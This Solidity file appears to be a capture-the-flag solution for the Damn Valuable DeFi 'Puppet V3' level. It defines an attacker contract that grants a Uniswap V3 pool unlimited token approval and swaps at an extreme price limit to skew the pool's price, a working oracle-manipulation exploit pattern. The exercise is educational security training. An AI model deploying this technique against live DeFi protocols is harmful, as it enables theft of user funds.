// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../DamnValuableToken.sol';
import 'hardhat/console.sol';
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
// import "@uniswap/v3-core/contracts/libraries/TickMath.sol";

interface IUniswapV3Pool is ISwapRouter {
  function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract PuppetV3Attacker {
    IUniswapV3Pool pool;
    DamnValuableToken token;
    address player;
    // extract from TickMath.sol => this is important to make the price skew towards a side
    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342; 

    constructor(IUniswapV3Pool _pool, DamnValuableToken _token, address _player) {
        pool = _pool;
        token = _token;
        player = _player;
    }

    function buyAllWeth() external {
        token.approve(address(pool), type(uint256).max);
        pool.swap(player, false, type(int256).max, MAX_SQRT_RATIO - 1, "");
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        token.transfer(msg.sender, uint(amount1Delta));
    }
}